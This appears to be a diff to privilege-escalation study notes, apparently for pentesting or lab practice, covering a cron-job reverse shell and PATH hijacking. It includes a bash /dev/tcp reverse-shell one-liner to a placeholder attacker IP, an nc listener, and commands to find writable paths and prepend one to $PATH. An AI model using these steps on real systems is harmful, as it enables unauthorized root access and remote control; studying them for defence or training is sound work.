@@ -20,3 +20,12 @@ via Crontabs
 3. add a reverse shell script command to the current job: bash -i >& /dev/tcp/<attacker's IP>/<port_number> 0>&1
 4. Start the listener on the attacker's IP nc -nlvp <port_number> 
 5. When the cronjob is executable, it will spin up a reverse shell with the account that runs the cronjob
+
+via Path
+
+1. We need to run a script that will gain access to root shell but it requires a command that is not found on the OS 
+2. echo $PATH to view all paths 
+3. find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u to view all editable paths
+3. Add the external binary to one of the editable paths
+4. export PATH='/editable_path':$PATH to add if it's not yet added to $PATH
+5. Run the script in the editable_path
